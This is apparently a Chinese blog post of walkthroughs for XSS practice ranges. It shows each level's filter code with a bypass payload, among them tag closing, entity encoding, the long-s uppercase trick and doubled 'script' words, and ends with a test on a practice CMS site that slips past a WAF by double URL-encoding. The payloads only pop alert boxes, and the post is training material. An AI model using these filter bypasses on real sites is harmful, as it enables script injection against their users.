---
title: XSS练习
date: 2022-01-16 14:34:20
tags:
      - 安全
      -
categories:
      - 安全
description:
keywords:
      - XSS
      - 练习
---

# XSS

### 练习靶场一

http://xss1.njhack.xyz

#### 0x00

服务器代码

```php
function render (input) {
  return '<div>' + input + '</div>'
}
```

通过分析代码可以得出,没有设防直接注入即可

```html
<scriPt>  
  alert(String.fromCharCode(49));
    </script>
```



#### 0x01



```php
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

从源码可以看出,可以看出输入的内容被包裹在 textarea中间了,这样我们输入的任何内容会被弄成文本

所以,我们只需要闭合textarea就可以了



```html
</textarea><script>alert(1)</script>
```



#### 0x02

```php
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

这题和第二题差不多,我们可以闭合input标签或者闭合"后构造其他语句,这里只给出一个答案

```html
"><script>alert(1)</script>
```



#### 0x03

```php
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

分析源码可以看出过滤了所有的`()` 我们可以使用\`\`来代替

```html
<script>alert`1`</script>
```





#### 0x04

```php
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

这个就是第三题多了个\`我们可以使用svg来解决

```html
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
```

转换网址在这https://www.qqxiuzi.cn/bianma/zifushiti.php

![image-20220116145138995](D:\Code\pojo\Blog\BlogHexo\public\img\xss.png)





#### 0x05

考验的是对于注释怎么解决

```php
function render (input) {
  input = input.replace(/-->/g, '😂')
  return '<!-- ' + input + ' -->'
}
```

可以使用--!>来进行闭合

```html
--!><script>alert(1)</script>
```



#### 0x06

考验的HTML的语法松散性,即换行也可继续赋值,这里他的正则是匹配了所有的auto，on开头=结尾还有>都会变被替换为_

```php
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

```html
onclick
="alert(1)"
```



#### 0x07

正则,匹配所有的闭合符号

```php
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

#### 0x08

这里的正则不太严谨,只屏蔽\</style\>我们只需要在最后换行就可以躲过了

```php
function render (src) {
  src = src.replace(/<\/style>/ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}
```

```html
</style
><script>alert(1)</script>
```



#### 0x09

```php
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```

同样的正则的过滤不太完全,只是匹配以https.....................开头的不管后面的

```html
http://www.segmentfault.com" onload="alert(1)"
```

#### 0x0A

```php
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```

这个的过滤就比较好了,过滤了很多特殊字符

但是我们可以使用https://...........@www.baidu.com这种链接,这个链接的效果是跳转到www.baidu.com前面的东西作为参数



#### 0x0B

```php
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```

将所有的输入都转化为大写,这样我们就用不了alert了,但是我们可以使用svg

```html
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
```

#### 0x0C

这题他不仅大写还屏蔽了所有的script

```php
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

这时候就可以使用古英文了,因为toUpperCase()会将古英文转换为现代英文

```html
<svg><ſcript>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</ſcript>
```





#### 0x0D

```php
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
```

换行跳过,没啥好说的

```JavaScript

alert(1);
-->
```



#### 0x0E

```php
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

屏蔽了<开头的英文字母



古英文

```JavaScript
<ſvg><ſcript>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</ſcript>
```

#### 0x0F

```php
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```

在onerror=""里面的内容貌似会自动识别字符实体转换

```JavaScript
');alert(1)//
```

#### 0x10

没啥好讲的,加个;结束上个语句然后写别的语句就可以了

```php
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```

```JavaScript
1;alert(1)
```

#### 0x12

```php
// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```

正则是给所有的\"替换成\\\\\"

所以我们在自己写个\\去替换掉就行了

```JavaScript
\");alert(1);//
```



### 练习靶场二

https://xssaq.com/yx/level1.php



第一题略



第二题

他给了一个输入框,随便输入点东西然后查看源代码

![image-20220116184634174](D:\Code\pojo\Blog\BlogHexo\public\img\xss-8.png)

他并没有把input里面的内容给屏蔽

所以可以直接构造

> " onclick="alert(1)"



第三题

直接查看源代码,然后测试是否可以闭合

![image-20220116184953951](D:\Code\pojo\Blog\BlogHexo\public\img\xss-9.png)

发现可以使用单引号闭合,然后自由发挥把



第三题和第四题一样



第五题还是弄闭合然后发现 on和script都用不了,于是使用a标签

> "><a href="javascript:alert(1)">

第六题和第五题一样就是href变成大写的





第七题

1.看源码2.测试脚本,发现script被替换为空了,3.使用双写测试

然后完成了

> "><scrscriptipt>alert(1)</scriscriptpt>



第八题

前端字符串中可以使用Unicode

![image-20220116195303204](D:\Code\pojo\Blog\BlogHexo\public\img\xss-10.png)



第九题

```

一定要包含http://
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://
javascript:alert(1)//http://
```



### 小型实战

http://chanzhi7.njhack.xyz/www/index.php

![image-20220116182410449](D:\Code\pojo\Blog\BlogHexo\public\img\xss-2.png)



我们要对本网站进行漏洞探查

首先进行搜索

输入单引号然后报错,判断有防火墙

![image-20220116182804828](D:\Code\pojo\Blog\BlogHexo\public\img\xss-3.png)



进行两次url转码然后查看效果,发现通过了

![image-20220116182853354](D:\Code\pojo\Blog\BlogHexo\public\img\xss-4.png)



然后查看网页源代码,然后分析构造漏洞

> '>\<script>alert(1)\</script>



![image-20220116183059503](D:\Code\pojo\Blog\BlogHexo\public\img\xss-5.png)

发现网页已经有改变了,但是还剩没有打到我们效果,查看源码

![image-20220116183204588](D:\Code\pojo\Blog\BlogHexo\public\img\xss-6.png)



发现\<script\>被屏蔽,我们再一次用url编码查看结果

![image-20220116183331018](D:\Code\pojo\Blog\BlogHexo\public\img\xss-7.png)

然后提交成功











